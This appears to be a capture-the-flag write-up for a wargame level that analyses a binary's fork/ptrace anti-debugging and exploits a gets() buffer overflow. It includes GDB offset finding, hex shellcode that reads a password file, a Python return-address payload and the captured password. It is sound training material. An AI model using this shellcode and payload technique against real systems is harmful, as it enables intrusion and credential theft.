Level4 implements **anti-debugging protection** using `fork()`, `ptrace()`, and process monitoring. The program creates a child process that sets up debugging protection, while the parent monitors for debugging attempts. However, it contains a **buffer overflow vulnerability** in the `gets()` function that can be exploited with shellcode.

## Key Assembly Analysis

### Main Function Structure
```assembly
0x080486d6 <+14>:    call   0x8048550 <fork@plt>          # fork() - Create child process
0x080486db <+19>:    mov    %eax,0xac(%esp)               # Store child PID
0x080486e2 <+26>:    lea    0x20(%esp),%ebx               # Load buffer address
0x080486f4 <+44>:    rep stos %eax,%es:(%edi)             # Initialize buffer with zeros
0x08048709 <+65>:    cmpl   $0x0,0xac(%esp)               # Check if child process
0x08048711 <+73>:    jne    0x8048769 <main+161>          # Jump to parent code
```

### Child Process (Anti-Debugging Setup)
```assembly
0x08048722 <+90>:    call   0x8048540 <prctl@plt>         # prctl(PR_SET_DUMPABLE, 1)
0x08048746 <+126>:   call   0x8048570 <ptrace@plt>        # ptrace(PTRACE_TRACEME, 0, 0, 0)
0x08048752 <+138>:   call   0x8048500 <puts@plt>          # puts("Give me some shellcode, k")
0x0804875e <+150>:   call   0x80484b0 <gets@plt>          # gets(buffer) - VULNERABLE!
```

### Parent Process (Debugger Detection)
```assembly
0x08048770 <+168>:   call   0x80484f0 <wait@plt>          # wait(&wait_status)
0x080487dc <+276>:   call   0x8048570 <ptrace@plt>        # ptrace(PTRACE_PEEKDATA, child_pid, 0x2c, 0)
0x080487e8 <+288>:   cmpl   $0xb,0xa8(%esp)               # Check if ptrace returned 0xb
0x080487f0 <+296>:   jne    0x8048768 <main+160>          # Loop if debugger detected
```

## Anti-Debugging Mechanisms

### 1. Fork Protection
- **Purpose**: Separate user input handling from monitoring
- **Implementation**: `fork()` creates child process
- **Effect**: Parent can monitor child without interference

### 2. Ptrace Protection
- **Purpose**: Prevent multiple debuggers from attaching
- **Implementation**: `ptrace(PTRACE_TRACEME, 0, 0, 0)` in child
- **Effect**: Only one debugger can attach to child process

### 3. Debugger Detection
- **Purpose**: Detect if external debugger is attached
- **Implementation**: Parent tries `ptrace(PTRACE_PEEKDATA)` on child
- **Logic**: If debugger attached, ptrace fails (returns -1)

### 4. Process Monitoring
- **Purpose**: Monitor child process status
- **Implementation**: `wait()` and status checking
- **Effect**: Detect if child was killed or stopped

## Vulnerability Analysis

The program uses `gets(buffer)` with **no bounds checking**, making it vulnerable to buffer overflow attacks.

### 1. Calculate Buffer Offset

Use GDB to find the exact offset:
```bash
gdb ./level04
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04 
[New process 2911]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2911]
0x41326641 in ?? ()
```

**Result**: `0x41326641` → Offset: **156 bytes**

### 2. Select Appropriate Shellcode

Since ptrace() monitors child memory, we **cannot use exec-based shellcode** (like `exec("/bin/sh)`) because:
- `exec()` keeps the process ID but replaces all program and memory
- This triggers the anti-debugging detection

Instead, use **file-reading shellcode** that opens and reads the password file directly:
- **Source**: https://shell-storm.org/shellcode/files/shellcode-73.html
- **Function**: Opens and reads `/home/users/level05/.pass`

### 3. Store Shellcode in Environment Variable

Export the shellcode as an environment variable and find its address:

```bash
export w=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
```

### 4. Find Shellcode Address

Create a C program to get the environment variable address:

```bash
echo '#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("%p\n", getenv("w"));
    return 0;
}' > /tmp/find.c

gcc -m32 /tmp/find.c -o /tmp/find
./find
```

**Result**: Address = `0xffffdf4b`

## Exploitation

### 1. Create the Payload

```bash
python -c "print 156 * 'a' + '\x4b\xdf\xff\xff'" | ./level04
```

### 2. Execute the Exploit


level04@OverRide:~$ python -c "print 156 * 'a' + '\x4b\xdf\xff\xff'" | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
